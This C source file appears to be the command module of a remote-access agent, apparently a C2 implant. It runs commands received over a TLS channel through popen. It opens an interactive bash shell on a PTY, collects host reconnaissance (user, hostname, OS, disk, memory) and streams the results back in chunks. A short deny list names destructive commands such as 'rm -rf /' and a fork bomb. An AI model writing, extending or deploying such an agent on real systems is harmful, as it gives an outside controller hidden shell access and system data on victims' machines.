
#include "command_execution.h"
#include "tls_wrapper.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <errno.h>
#include <time.h>
#include <signal.h>


_Static_assert(4096 <= 4096, "TX buffer exceeds 4096 B limit");

#ifdef PH_ENABLE_DEBUG_LOG
#define DEBUG_LOG(fmt, ...) fprintf(stderr, "[DEBUG] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_LOG(fmt, ...)
#endif

static char g_oneshot_output[PH_CMD_MAX_OUTPUT_SIZE];

static uint64_t get_timestamp_ms(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) == 0) {
        return (uint64_t)(ts.tv_sec * 1000 + ts.tv_nsec / 1000000);
    }
    return 0;
}

int ph_cmd_validate(const ph_command_t *cmd) {
    if (cmd == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (memcmp(cmd->magic, PH_CMD_MAGIC, PH_CMD_MAGIC_SIZE) != 0) {
        return PH_ERR_INVALID_ARG;
    }

    if (cmd->opcode < PH_CMD_EXECUTE || cmd->opcode > PH_CMD_TERMINATE) {
        return PH_ERR_INVALID_ARG;
    }

    if (cmd->payload_len > PH_BUFFER_SIZE) {
        return PH_ERR_INVALID_ARG;
    }

    return PH_OK;
}

int ph_cmd_parse(ph_command_t *cmd, const uint8_t *raw_data, size_t data_len) {
    if (cmd == NULL || raw_data == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (data_len < 7) {
        return PH_ERR_INVALID_ARG;
    }

    memset(cmd, 0, sizeof(ph_command_t));

    memcpy(cmd->magic, raw_data, PH_CMD_MAGIC_SIZE);
    if (memcmp(cmd->magic, PH_CMD_MAGIC, PH_CMD_MAGIC_SIZE) != 0) {
        return PH_ERR_INVALID_ARG;
    }

    cmd->opcode = raw_data[4];

    cmd->payload_len = (uint16_t)((raw_data[5] << 8) | raw_data[6]);

    if (cmd->payload_len > PH_BUFFER_SIZE) {
        return PH_ERR_INVALID_ARG;
    }

    if (data_len < (size_t)(7 + cmd->payload_len)) {
        return PH_ERR_INVALID_ARG;
    }

    if (cmd->payload_len > 0) {
        memcpy(cmd->payload, raw_data + 7, cmd->payload_len);
        cmd->payload[cmd->payload_len] = '\0';
    }

    return PH_OK;
}

int ph_cmd_execute(const ph_command_t *cmd, ph_exec_ctx_t *ctx) {
    if (cmd == NULL || ctx == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (ph_cmd_validate(cmd) != PH_OK) {
        return PH_ERR_INVALID_ARG;
    }

    if (cmd->opcode != PH_CMD_EXECUTE) {
        return PH_ERR_INVALID_ARG;
    }

    memset(ctx, 0, sizeof(ph_exec_ctx_t));
    memcpy(&ctx->current_command, cmd, sizeof(ph_command_t));
    ctx->master_fd = -1;
    ctx->is_running = 0;
    ctx->timeout_ms = PH_CMD_DEFAULT_TIMEOUT_MS;
    ctx->start_time = get_timestamp_ms();

    char full_cmd[PH_BUFFER_SIZE + 16];
    int ret = snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd->payload);
    if (ret < 0 || ret >= (int)sizeof(full_cmd)) {
        return PH_ERR_INVALID_ARG;
    }

    FILE *pipe = popen(full_cmd, "r");
    if (pipe == NULL) {
        return PH_ERR_SOCKET;
    }

    char read_buf[4096];
    ctx->result.exit_code = 0;
    ctx->result.total_output_len = 0;

    
    int pipe_fd = fileno(pipe);
    int flags = fcntl(pipe_fd, F_GETFL, 0);
    fcntl(pipe_fd, F_SETFL, flags | O_NONBLOCK);

    while (1) {
        if (fgets(read_buf, sizeof(read_buf), pipe) != NULL) {
            size_t len = strlen(read_buf);
            if (ctx->result.total_output_len + len < PH_CMD_MAX_OUTPUT_SIZE - 1) {
                memcpy(g_oneshot_output + ctx->result.total_output_len, read_buf, len);
                ctx->result.total_output_len += len;
            } else {
                
                while (fgets(read_buf, sizeof(read_buf), pipe) != NULL);
                break;
            }
        } else {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(10000); 
                if (get_timestamp_ms() - ctx->start_time > ctx->timeout_ms) break;
                continue;
            }
            break; 
        }
    }
    g_oneshot_output[ctx->result.total_output_len] = '\0';

    int status = pclose(pipe);
    if (WIFEXITED(status)) {
        ctx->result.exit_code = WEXITSTATUS(status);
    }

    return PH_OK;
}

int ph_cmd_read_output(ph_exec_ctx_t *ctx, char *buffer, size_t max_len, size_t *read_len) {
    if (ctx == NULL || buffer == NULL || read_len == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->master_fd < 0) {

        if (ctx->result.total_output_len > 0 && ctx->result.total_output_len < max_len) {
            memcpy(buffer, g_oneshot_output, ctx->result.total_output_len);
            *read_len = ctx->result.total_output_len;

            ctx->result.total_output_len = 0;
            return PH_OK;
        }

        *read_len = 0;
        return PH_OK;
    }

    return ph_pty_read_output(ctx, buffer, max_len, read_len);
}

int ph_cmd_wait(ph_exec_ctx_t *ctx) {
    if (ctx == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->master_fd < 0) {
        return PH_OK;
    }

    return PH_OK;
}

void ph_cmd_close(ph_exec_ctx_t *ctx) {
    if (ctx == NULL) {
        return;
    }

    if (ctx->master_fd >= 0) {
        ph_pty_close(ctx);
    }

    ctx->is_running = 0;
    memset(&ctx->current_command, 0, sizeof(ph_command_t));
}

int ph_cmd_build_chunk(ph_output_chunk_t *chunk, const char *data,
                        size_t data_len, uint16_t chunk_idx,
                        uint16_t total_chunks, uint8_t opcode) {
    if (chunk == NULL || data == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (data_len > PH_CMD_CHUNK_SIZE) {
        data_len = PH_CMD_CHUNK_SIZE;
    }

    memset(chunk, 0, sizeof(ph_output_chunk_t));

    memcpy(chunk->magic, PH_CMD_MAGIC, PH_CMD_MAGIC_SIZE);

    chunk->opcode = opcode;
    chunk->chunk_index = chunk_idx;
    chunk->total_chunks = total_chunks;
    chunk->chunk_len = (uint16_t)data_len;

    if (data_len > 0) {
        memcpy(chunk->data, data, data_len);
    }

    return PH_OK;
}

int ph_cmd_send_chunked(void *tls_ctx, const char *output, size_t output_len,
                         uint8_t opcode, int exit_code) {
    if (tls_ctx == NULL || output == NULL) {
        return PH_ERR_NULL_PTR;
    }

    ph_tls_ctx_t *ctx = (ph_tls_ctx_t *)tls_ctx;

    ph_agent_is_busy = true;

    uint16_t total_chunks = (uint16_t)((output_len + PH_CMD_CHUNK_SIZE - 1) / PH_CMD_CHUNK_SIZE);
    if (total_chunks == 0) {
        total_chunks = 1;
    }

    DEBUG_LOG("[CHUNK] Sending %zu bytes in %u chunks (exit_code=%d)\n",
              output_len, total_chunks, exit_code);

    uint8_t _packet[4110];

    uint16_t chunk_idx = 0;
    size_t offset = 0;

    while (offset < output_len || chunk_idx == 0) {

        memset(_packet, 0, sizeof(_packet));

        size_t chunk_data_len = output_len - offset;
        if (chunk_data_len > PH_CMD_CHUNK_SIZE) {
            chunk_data_len = PH_CMD_CHUNK_SIZE;
        }

        int is_last_chunk = (chunk_idx == total_chunks - 1);
        uint16_t actual_data_len = (uint16_t)chunk_data_len;

        if (is_last_chunk) {
            actual_data_len = (uint16_t)(chunk_data_len + 1);
        }

        DEBUG_LOG("[CHUNK] #%u/%u: data_len=%zu, actual_len=%u, is_last=%d\n",
                  chunk_idx, total_chunks, chunk_data_len, actual_data_len, is_last_chunk);

        _packet[0] = 'P';
        _packet[1] = 'H';
        _packet[2] = 'N';
        _packet[3] = 'T';
        _packet[4] = opcode;
        _packet[5] = (chunk_idx >> 8) & 0xFF;
        _packet[6] = chunk_idx & 0xFF;
        _packet[7] = (total_chunks >> 8) & 0xFF;
        _packet[8] = total_chunks & 0xFF;
        _packet[9] = (actual_data_len >> 8) & 0xFF;
        _packet[10] = actual_data_len & 0xFF;

        if (chunk_data_len > 0) {
            memcpy(&_packet[11], output + offset, chunk_data_len);
        }

        if (is_last_chunk) {
            _packet[11 + chunk_data_len] = (uint8_t)(exit_code & 0xFF);
        }

        size_t packet_size = 11 + actual_data_len;

        if (_packet[0] != 'P' || _packet[1] != 'H' ||
            _packet[2] != 'N' || _packet[3] != 'T') {
            return PH_ERR_INVALID_ARG;
        }

        ssize_t sent = ph_tls_send(ctx, _packet, packet_size);
        if (sent < 0 || (size_t)sent != packet_size) {
            DEBUG_LOG("[ERROR] Failed to send chunk #%u: sent=%zd, expected=%zu\n",
                      chunk_idx, sent, packet_size);
            return PH_ERR_NETWORK;
        }

        DEBUG_LOG("[CHUNK] Sent %zu bytes\n", packet_size);

        offset += chunk_data_len;
        chunk_idx++;

        if (chunk_idx < total_chunks) {
            usleep(PH_CMD_CHUNK_INTER_DELAY_US);
        }

        if (chunk_idx > total_chunks) {
            break;
        }
    }

    ph_agent_is_busy = false;

    return PH_OK;
}

int ph_cmd_get_system_info(char *buffer, size_t max_len) {
    if (buffer == NULL || max_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    const char *cmds[] = {
        "uname -a",
        "whoami",
        "hostname",
        "cat /etc/os-release 2>/dev/null | head -n 5",
        "nproc",
        "free -h 2>/dev/null | head -n 2",
        "df -h / 2>/dev/null | tail -n 1",
        NULL
    };

    size_t offset = 0;
    for (int i = 0; cmds[i] != NULL; i++) {
        FILE *pipe = popen(cmds[i], "r");
        if (pipe == NULL) {
            continue;
        }

        char line[256];
        while (fgets(line, sizeof(line), pipe) != NULL) {
            size_t line_len = strlen(line);
            if (offset + line_len < max_len - 1) {
                memcpy(buffer + offset, line, line_len);
                offset += line_len;
            } else {
                break;
            }
        }

        if (offset < max_len - 1) {
            buffer[offset++] = '\n';
        }

        pclose(pipe);

        if (offset >= max_len - 1) {
            break;
        }
    }

    buffer[offset] = '\0';
    return PH_OK;
}

int ph_pty_start_shell(ph_exec_ctx_t *ctx) {
    if (ctx == NULL) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_exec_ctx_t));
    ctx->master_fd = -1;
    ctx->child_pid = -1;
    ctx->is_running = 0;
    ctx->timeout_ms = PH_CMD_DEFAULT_TIMEOUT_MS;
    ctx->start_time = get_timestamp_ms();

    ctx->winsize.ws_row = 40;
    ctx->winsize.ws_col = 120;
    ctx->winsize.ws_xpixel = 0;
    ctx->winsize.ws_ypixel = 0;

    struct termios slave_termios;
    memset(&slave_termios, 0, sizeof(slave_termios));

    pid_t pid = forkpty(&ctx->master_fd, NULL, &slave_termios, &ctx->winsize);

    if (pid < 0) {
        DEBUG_LOG("[ERROR] forkpty() failed: %s", strerror(errno));
        return PH_ERR_SOCKET;
    }

    if (pid == 0) {

        setenv("HUSHLOGIN", "1", 1);

        setenv("TERM", "xterm-256color", 1);
        setenv("SHELL", "/bin/bash", 1);
        setenv("COLORTERM", "truecolor", 1);

        execvp("/bin/bash", (char *const[]){"bash", "-l", "-i", NULL});

        _exit(127);
    }

    ctx->child_pid = pid;
    ctx->is_running = 1;

    struct termios master_termios;
    if (tcgetattr(ctx->master_fd, &master_termios) == 0) {
        master_termios.c_oflag |= (OPOST | ONLCR);
        tcsetattr(ctx->master_fd, TCSANOW, &master_termios);
    }

    int flags = fcntl(ctx->master_fd, F_GETFL, 0);
    if (flags >= 0) {
        fcntl(ctx->master_fd, F_SETFL, flags | O_NONBLOCK);
    }

    ioctl(ctx->master_fd, TIOCSWINSZ, &ctx->winsize);
    kill(ctx->child_pid, SIGWINCH);

    DEBUG_LOG("[PTY] Shell started PID %d, master_fd=%d", pid, ctx->master_fd);

    return PH_OK;
}

int ph_pty_write_input(ph_exec_ctx_t *ctx, const char *data, size_t len) {
    if (ctx == NULL || data == NULL || !ctx->is_running) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->master_fd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    const char *ptr = data;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t written = write(ctx->master_fd, ptr, remaining);
        if (written < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                return PH_ERR_TIMEOUT;
            }
            DEBUG_LOG("[ERROR] PTY write failed: %s", strerror(errno));
            return PH_ERR_NETWORK;
        }

        if (written == 0) {
            return PH_ERR_NETWORK;
        }

        ptr += written;
        remaining -= (size_t)written;
    }

    return PH_OK;
}

int ph_pty_read_output(ph_exec_ctx_t *ctx, char *buffer, size_t max_len, size_t *read_len) {
    if (ctx == NULL || buffer == NULL || read_len == NULL) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->master_fd < 0 || !ctx->is_running) {
        return PH_ERR_INVALID_ARG;
    }

    uint64_t now = get_timestamp_ms();
    if (now > ctx->start_time + ctx->timeout_ms) {
        DEBUG_LOG("[PTY] Session timeout");
        ph_pty_close(ctx);
        return PH_ERR_TIMEOUT;
    }

    ssize_t bytes = read(ctx->master_fd, buffer, max_len - 1);
    if (bytes < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            *read_len = 0;
            return PH_OK;
        }
        DEBUG_LOG("[ERROR] PTY read failed: %s", strerror(errno));
        return PH_ERR_NETWORK;
    }

    if (bytes == 0) {

        *read_len = 0;
        return PH_ERR_NETWORK;
    }

    buffer[bytes] = '\0';
    *read_len = (size_t)bytes;

    tcdrain(ctx->master_fd);
    tcflush(ctx->master_fd, TCIOFLUSH);

    return PH_OK;
}

void ph_pty_close(ph_exec_ctx_t *ctx) {
    if (ctx == NULL) {
        return;
    }

    if (ctx->master_fd >= 0) {
        close(ctx->master_fd);
        ctx->master_fd = -1;
    }

    if (ctx->child_pid > 0) {
        kill(ctx->child_pid, SIGTERM);
        waitpid(ctx->child_pid, NULL, WNOHANG);
        ctx->child_pid = -1;
    }

    ctx->is_running = 0;
    DEBUG_LOG("[PTY] Shell closed");
}

int ph_pty_resize(ph_exec_ctx_t *ctx, uint16_t rows, uint16_t cols) {
    if (ctx == NULL || ctx->master_fd < 0) {
        return PH_ERR_NULL_PTR;
    }

    ctx->winsize.ws_row = rows;
    ctx->winsize.ws_col = cols;

    if (ioctl(ctx->master_fd, TIOCSWINSZ, &ctx->winsize) < 0) {
        DEBUG_LOG("[ERROR] TIOCSWINSZ failed: %s", strerror(errno));
        return PH_ERR_INVALID_ARG;
    }

    if (ctx->child_pid > 0) {
        kill(ctx->child_pid, SIGWINCH);
    }

    DEBUG_LOG("[PTY] Resized to %dx%d", rows, cols);
    return PH_OK;
}

const char* ph_cmd_opcode_string(ph_cmd_opcode_t opcode) {
    switch (opcode) {
        case PH_CMD_EXECUTE:   return "EXECUTE";
        case PH_CMD_UPLOAD:    return "UPLOAD";
        case PH_CMD_DOWNLOAD:  return "DOWNLOAD";
        case PH_CMD_SHELL:     return "SHELL";
        case PH_CMD_INFO:      return "INFO";
        case PH_CMD_PING:      return "PING";
        case PH_CMD_TERMINATE: return "TERMINATE";
        default:               return "UNKNOWN";
    }
}

int ph_cmd_is_safe(const char *command) {
    if (command == NULL) {
        return 0;
    }

    const char *dangerous[] = {
        "rm -rf /",
        "mkfs",
        "dd if=/dev/zero",
        ":(){:|:&};:",
        "> /dev/sda",
        NULL
    };

    for (int i = 0; dangerous[i] != NULL; i++) {
        if (strstr(command, dangerous[i]) != NULL) {
            return 0;
        }
    }

    return 1;
}

void ph_cmd_escape_args(char *escaped, size_t max_len, const char *args) {
    if (escaped == NULL || args == NULL || max_len == 0) {
        return;
    }

    size_t src_idx = 0;
    size_t dst_idx = 0;

    while (args[src_idx] != '\0' && dst_idx < max_len - 2) {
        if (args[src_idx] == '"' || args[src_idx] == '\'' ||
            args[src_idx] == '\\' || args[src_idx] == '$' ||
            args[src_idx] == '`') {
            if (dst_idx < max_len - 3) {
                escaped[dst_idx++] = '\\';
            } else {
                break;
            }
        }
        escaped[dst_idx++] = args[src_idx++];
    }
    escaped[dst_idx] = '\0';
}

int ph_socket_flush(void *tls_ctx)
{
    if (tls_ctx == NULL) return PH_ERR_NULL_PTR;
    ph_tls_ctx_t *ctx = (ph_tls_ctx_t *)tls_ctx;
    int socket_fd = ctx->socket_fd;

    int flags = fcntl(socket_fd, F_GETFL, 0);
    if (flags < 0) return PH_ERR_SOCKET;
    
    if (fcntl(socket_fd, F_SETFL, flags | O_NONBLOCK) < 0) return PH_ERR_SOCKET;

    char junk[4096];
    
    while (ph_tls_recv(ctx, junk, sizeof(junk)) > 0);

    if (fcntl(socket_fd, F_SETFL, flags) < 0) return PH_ERR_SOCKET;

    return PH_OK;
}
